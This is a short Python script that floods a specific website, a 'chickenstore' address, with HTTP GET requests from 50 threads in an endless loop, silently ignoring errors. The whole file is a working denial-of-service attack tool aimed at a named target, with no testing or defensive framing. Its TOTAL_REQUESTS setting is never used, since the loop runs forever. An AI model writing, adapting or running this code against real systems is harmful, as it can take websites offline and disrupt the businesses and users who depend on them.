import requests
import threading

TARGET_URL = "https://chickenstore.rexzy.xyz/home"
TOTAL_REQUESTS = 10000000  # Set your desired number here
THREADS_COUNT = 50

def send_request():
    while True:
        try:
            requests.get(TARGET_URL, timeout=5)
        except Exception:
            pass

def start_flood():
    threads = []
    
    for _ in range(THREADS_COUNT):
        thread = threading.Thread(target=send_request)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    start_flood()
    